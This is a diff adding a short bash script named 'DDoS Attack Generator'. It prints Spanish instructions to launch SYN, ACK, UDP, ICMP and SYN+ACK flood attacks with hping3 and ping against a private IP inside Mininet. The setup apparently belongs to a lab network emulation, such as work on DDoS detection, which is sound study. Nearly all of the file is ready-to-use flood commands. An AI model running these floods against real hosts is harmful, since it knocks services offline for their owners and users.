@@ -1,0 +1,20 @@
+#!/bin/bash
+
+TARGET_IP="10.1.1.2"
+
+echo "=============================================="
+echo "   DDoS Attack Generator"
+echo "=============================================="
+echo ""
+echo "Target IP: $TARGET_IP"
+echo ""
+echo "Ejecuta estos comandos en Mininet CLI:"
+echo ""
+echo "SYN Flood:   h1 hping3 --flood -S -p 80 $TARGET_IP"
+echo "ACK Flood:   h1 hping3 --flood -A -p 80 $TARGET_IP"
+echo "UDP Flood:   h1 hping3 --flood --udp -p 80 $TARGET_IP"
+echo "ICMP Flood:  h1 ping -f $TARGET_IP"
+echo "SYN+ACK:    h1 hping3 --flood -S -A -p 80 $TARGET_IP"
+echo ""
+echo "Ctrl+C para detener"
+echo ""
